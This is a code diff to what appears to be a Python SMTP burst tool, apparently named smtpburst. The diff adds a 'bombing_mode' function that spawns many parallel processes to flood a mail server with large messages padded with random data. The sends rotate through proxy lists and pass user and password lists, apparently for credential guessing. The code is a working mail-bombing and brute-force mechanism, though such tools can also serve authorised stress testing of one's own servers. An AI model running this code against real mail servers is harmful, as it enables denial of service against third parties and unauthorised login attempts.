@@ -1,6 +1,7 @@
 import smtplib
 import socket
 import time
+import sys
 from smtplib import (
     SMTPException,
     SMTPSenderRefused,
@@ -144,3 +145,56 @@ def parse_server(server: str) -> Tuple[str, int]:
 def open_sockets(host: str, count: int, port: int = 25):
     """Delegate to :mod:`smtpburst.attacks` implementation."""
     return attacks.open_sockets(host, count, port)
+
+def bombing_mode(cfg: Config) -> None:
+    """Run burst sending autonomously using provided configuration."""
+    from multiprocessing import Manager, Process
+
+    print(f"Generating {sizeof_fmt(cfg.SB_SIZE)} of data to append to message")
+    manager = Manager()
+    fail_count = manager.Value('i', 0)
+    message = appendMessage(cfg)
+    print(f"Message using {sizeof_fmt(sys.getsizeof(message))} of random data")
+
+    for b in range(cfg.SB_BURSTS):
+        if cfg.SB_PER_BURST_DATA:
+            message = appendMessage(cfg)
+        numbers = range(1, cfg.SB_SGEMAILS + 1)
+        procs = []
+        if fail_count.value >= cfg.SB_STOPFQNT and cfg.SB_STOPFAIL:
+            break
+        for number in numbers:
+            if fail_count.value >= cfg.SB_STOPFQNT and cfg.SB_STOPFAIL:
+                break
+            time.sleep(cfg.SB_SGEMAILSPSEC)
+            proxy = None
+            if cfg.SB_PROXIES:
+                idx = (number + (b * cfg.SB_SGEMAILS) - 1) % len(cfg.SB_PROXIES)
+                proxy = cfg.SB_PROXIES[idx]
+            proc = Process(
+                target=sendmail,
+                args=(
+                    number + (b * cfg.SB_SGEMAILS),
+                    b + 1,
+                    fail_count,
+                    message,
+                    cfg,
+                ),
+                kwargs={
+                    'server': cfg.SB_SERVER,
+                    'proxy': proxy,
+                    'users': cfg.SB_USERLIST,
+                    'passwords': cfg.SB_PASSLIST,
+                },
+            )
+            procs.append(proc)
+            proc.start()
+        for proc in procs:
+            proc.join()
+        time.sleep(cfg.SB_BURSTSPSEC)
+
+    if cfg.SB_RAND_STREAM:
+        try:
+            cfg.SB_RAND_STREAM.close()
+        except Exception:
+            pass
